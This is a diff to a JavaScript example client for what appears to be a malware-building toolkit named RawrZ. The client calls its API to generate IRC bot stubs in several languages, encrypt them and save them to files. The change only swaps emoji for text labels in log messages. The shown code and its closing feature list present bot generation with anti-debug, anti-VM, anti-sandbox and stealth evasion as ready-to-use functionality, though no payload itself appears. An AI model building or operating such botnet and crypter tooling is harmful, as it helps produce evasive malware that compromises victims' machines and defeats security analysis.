@@ -72,7 +72,7 @@ class IRCBotStubExample {
             });
 
             if (result.status === 200) {
-                console.log('✅ Basic stub generated successfully!');
+                console.log('[OK] Basic stub generated successfully!');
                 console.log(`Bot ID: ${result.data.result.botId}`);
                 console.log(`Generated languages: ${Object.keys(result.data.result.bots).join(', ')}`);
                 
@@ -85,10 +85,10 @@ class IRCBotStubExample {
                     console.log(`  - Encryption: ${bot.encryption}`);
                 }
             } else {
-                console.log('❌ Basic stub generation failed:', result.data);
+                console.log('[ERROR] Basic stub generation failed:', result.data);
             }
         } catch (error) {
-            console.log('❌ Error:', error.message);
+            console.log('[ERROR] Error:', error.message);
         }
     }
 
@@ -125,7 +125,7 @@ class IRCBotStubExample {
             });
 
             if (result.status === 200) {
-                console.log('✅ Encrypted stub generated successfully!');
+                console.log('[OK] Encrypted stub generated successfully!');
                 console.log(`Bot ID: ${result.data.result.botId}`);
                 console.log(`Encryption Applied: ${result.data.result.encryptionApplied}`);
                 
@@ -140,10 +140,10 @@ class IRCBotStubExample {
                 console.log(`\nEncrypted Stub Preview (first 200 chars):`);
                 console.log(cppBot.code.substring(0, 200) + '...');
             } else {
-                console.log('❌ Encrypted stub generation failed:', result.data);
+                console.log('[ERROR] Encrypted stub generation failed:', result.data);
             }
         } catch (error) {
-            console.log('❌ Error:', error.message);
+            console.log('[ERROR] Error:', error.message);
         }
     }
 
@@ -176,7 +176,7 @@ class IRCBotStubExample {
 
             if (stubResult.status === 200) {
                 const pythonStub = stubResult.data.result.bots.python;
-                console.log('✅ Basic stub generated for encryption');
+                console.log('[OK] Basic stub generated for encryption');
                 
                 // Now encrypt the stub
                 const encryptResult = await this.apiCall('/irc-bot/encrypt-stub', 'POST', {
@@ -186,18 +186,18 @@ class IRCBotStubExample {
                 });
 
                 if (encryptResult.status === 200) {
-                    console.log('✅ Stub encrypted successfully!');
+                    console.log('[OK] Stub encrypted successfully!');
                     console.log(`Algorithm: ${encryptResult.data.result.algorithm}`);
                     console.log(`Encrypted size: ${encryptResult.data.result.encrypted.length} characters`);
                     console.log(`Key: ${encryptResult.data.result.key ? 'Provided' : 'Auto-generated'}`);
                 } else {
-                    console.log('❌ Stub encryption failed:', encryptResult.data);
+                    console.log('[ERROR] Stub encryption failed:', encryptResult.data);
                 }
             } else {
-                console.log('❌ Basic stub generation failed:', stubResult.data);
+                console.log('[ERROR] Basic stub generation failed:', stubResult.data);
             }
         } catch (error) {
-            console.log('❌ Error:', error.message);
+            console.log('[ERROR] Error:', error.message);
         }
     }
 
@@ -235,7 +235,7 @@ class IRCBotStubExample {
 
             if (stubResult.status === 200) {
                 const jsStub = stubResult.data.result.bots.javascript;
-                console.log('✅ Encrypted stub generated');
+                console.log('[OK] Encrypted stub generated');
                 
                 // Save encrypted stub to file
                 const saveResult = await this.apiCall('/irc-bot/save-encrypted-stub', 'POST', {
@@ -246,18 +246,18 @@ class IRCBotStubExample {
                 });
 
                 if (saveResult.status === 200) {
-                    console.log('✅ Encrypted stub saved to file successfully!');
+                    console.log('[OK] Encrypted stub saved to file successfully!');
                     console.log(`Filename: ${saveResult.data.result.filename}`);
                     console.log(`File size: ${saveResult.data.result.size} bytes`);
                     console.log(`Encryption: ${saveResult.data.encrypted.algorithm}`);
                 } else {
-                    console.log('❌ Failed to save encrypted stub:', saveResult.data);
+                    console.log('[ERROR] Failed to save encrypted stub:', saveResult.data);
                 }
             } else {
-                console.log('❌ Encrypted stub generation failed:', stubResult.data);
+                console.log('[ERROR] Encrypted stub generation failed:', stubResult.data);
             }
         } catch (error) {
-            console.log('❌ Error:', error.message);
+            console.log('[ERROR] Error:', error.message);
         }
     }
 
@@ -294,7 +294,7 @@ class IRCBotStubExample {
             });
 
             if (result.status === 200) {
-                console.log('✅ Multi-language encrypted stubs generated successfully!');
+                console.log('[OK] Multi-language encrypted stubs generated successfully!');
                 console.log(`Bot ID: ${result.data.result.botId}`);
                 console.log(`Languages: ${Object.keys(result.data.result.bots).join(', ')}`);
                 
@@ -308,10 +308,10 @@ class IRCBotStubExample {
                     console.log(`  - Features: ${features.length} features included`);
                 }
             } else {
-                console.log('❌ Multi-language stub generation failed:', result.data);
+                console.log('[ERROR] Multi-language stub generation failed:', result.data);
             }
         } catch (error) {
-            console.log('❌ Error:', error.message);
+            console.log('[ERROR] Error:', error.message);
         }
     }
 
@@ -353,21 +353,21 @@ class IRCBotStubExample {
 
                 if (result.status === 200) {
                     const cppBot = result.data.result.bots.cpp;
-                    console.log(`✅ ${algorithm.toUpperCase()} stub generated successfully`);
+                    console.log(`[OK] ${algorithm.toUpperCase()} stub generated successfully`);
                     console.log(`  - Size: ${cppBot.size} bytes`);
                     console.log(`  - Encrypted: ${cppBot.encrypted}`);
                 } else {
-                    console.log(`❌ ${algorithm.toUpperCase()} stub generation failed`);
+                    console.log(`[ERROR] ${algorithm.toUpperCase()} stub generation failed`);
                 }
             } catch (error) {
-                console.log(`❌ ${algorithm.toUpperCase()} error:`, error.message);
+                console.log(`[ERROR] ${algorithm.toUpperCase()} error:`, error.message);
             }
         }
     }
 
     // Run all examples
     async runAllExamples() {
-        console.log('🚀 RawrZ IRC Bot Stub Generation & Encryption Examples');
+        console.log('[ROCKET] RawrZ IRC Bot Stub Generation & Encryption Examples');
         console.log('=' .repeat(60));
         
         try {
@@ -378,17 +378,17 @@ class IRCBotStubExample {
             await this.generateMultiLanguageStubs();
             await this.testAdvancedEncryption();
             
-            console.log('\n🎉 All examples completed successfully!');
+            console.log('\n[SUCCESS] All examples completed successfully!');
             console.log('\nKey Features Demonstrated:');
-            console.log('✅ Multi-language stub generation (C++, Python, JavaScript, Go, Rust)');
-            console.log('✅ Advanced encryption algorithms (AES, ChaCha20, Camellia, ARIA, etc.)');
-            console.log('✅ Anti-analysis features (Anti-Debug, Anti-VM, Anti-Sandbox)');
-            console.log('✅ Stealth mode integration');
-            console.log('✅ File encryption and saving');
-            console.log('✅ Complete API integration');
+            console.log('[OK] Multi-language stub generation (C++, Python, JavaScript, Go, Rust)');
+            console.log('[OK] Advanced encryption algorithms (AES, ChaCha20, Camellia, ARIA, etc.)');
+            console.log('[OK] Anti-analysis features (Anti-Debug, Anti-VM, Anti-Sandbox)');
+            console.log('[OK] Stealth mode integration');
+            console.log('[OK] File encryption and saving');
+            console.log('[OK] Complete API integration');
             
         } catch (error) {
-            console.log('\n❌ Examples failed:', error.message);
+            console.log('\n[ERROR] Examples failed:', error.message);
         }
     }
 }
